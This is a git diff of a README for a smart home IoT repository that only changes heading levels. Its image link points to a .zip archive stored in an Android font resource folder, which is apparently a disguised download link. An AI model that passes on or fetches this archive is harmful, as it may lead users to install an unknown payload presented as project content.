@@ -4,7 +4,7 @@ Welcome to the **IoT Smart Home Automation** project! This repository showcases 
 
 ![Smart Home Automation](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
-## Table of Contents
+# Table of Contents
 
 - [Features](#features)
 - [Technologies Used](#technologies-used)
@@ -15,7 +15,7 @@ Welcome to the **IoT Smart Home Automation** project! This repository showcases 
 - [Contact](#contact)
 - [Releases](#releases)
 
-## Features
+# Features
 
 - **Control 8 AC Appliances**: Manage multiple devices effortlessly.
 - **Smart Door Control**: Secure your home with a smart door system.
